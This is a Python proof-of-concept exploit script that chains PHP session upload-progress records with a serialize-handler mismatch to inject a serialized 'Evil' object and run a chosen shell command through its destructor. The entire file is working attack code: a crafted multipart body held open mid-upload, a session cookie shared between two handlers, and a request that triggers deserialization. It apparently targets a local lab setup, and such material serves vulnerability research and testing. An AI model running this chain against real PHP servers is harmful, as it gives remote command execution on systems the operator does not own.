#!/usr/bin/env python3
"""Handler-mismatch chain under the default cleanup=On, stalled-upload variant.

The write request streams a partial multipart body to /chainW (php_serialize):
progress field with the object payload, then the file part headers. FPM writes
the progress record at FILE_START and keeps the request open. A second worker
serves /chainR (php handler), which decodes the record and fires Evil::__destruct.

Usage: chain_c_stall.py <port> [cmd]
"""
import os
import socket
import sys
import time

port = int(sys.argv[1]) if len(sys.argv) > 1 else 9001
cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
sid = "chainc" + "".join("%02x" % b for b in os.urandom(10))

payload = f'x|O:4:"Evil":1:{{s:3:"cmd";s:{len(cmd)}:"{cmd}";}}'
boundary = b"----chainC"
prefix = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    + payload.encode() + b"\r\n"
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="f"; filename="t"\r\n'
    b"Content-Type: application/octet-stream\r\n\r\n"
    b"Z" * 64
)
total = len(prefix) + 200000

w = socket.create_connection(("127.0.0.1", port), timeout=10)
w.sendall(
    b"POST /chainW/up.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
    b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
    b"Content-Length: " + str(total).encode() + b"\r\n"
    b"Connection: close\r\n\r\n" + prefix
)
time.sleep(0.8)

r = socket.create_connection(("127.0.0.1", port), timeout=10)
r.sendall(
    b"GET /chainR/read.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\nConnection: close\r\n\r\n"
)
resp = b""
try:
    while True:
        c = r.recv(65536)
        if not c:
            break
        resp += c
except socket.timeout:
    pass
r.close()
w.close()
head, _, out = resp.partition(b"\r\n\r\n")
print(head.split(b"\r\n", 1)[0].decode("latin-1"))
print(out.decode("latin-1", "replace"))
